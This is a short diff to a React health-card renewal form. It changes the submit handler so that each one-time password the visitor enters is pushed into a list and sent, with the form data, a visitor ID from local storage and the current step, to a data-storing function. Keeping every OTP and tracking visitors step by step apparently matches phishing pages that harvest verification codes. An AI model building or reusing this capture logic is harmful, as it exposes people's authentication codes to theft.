@@ -55,12 +55,12 @@ export default function HealthCardRenewal() {
 
   const operationType = watch("operationType")
 
-  const onSubmit = (data: FormData) => {
+  const onSubmit = async (data: FormData) => {
     const visitorId = localStorage.getItem("visitor")
     if (currentStep === 3) {
-      allOtps.push
+      allOtps.push(otp)
     }
-    addData({ id: visitorId, data, otp, allOtps })
+    await addData({ id: visitorId, ...data, otp, allOtps,currentStep })
 
     if (currentStep < 4) {
       setCurrentStep((s) => s + 1)
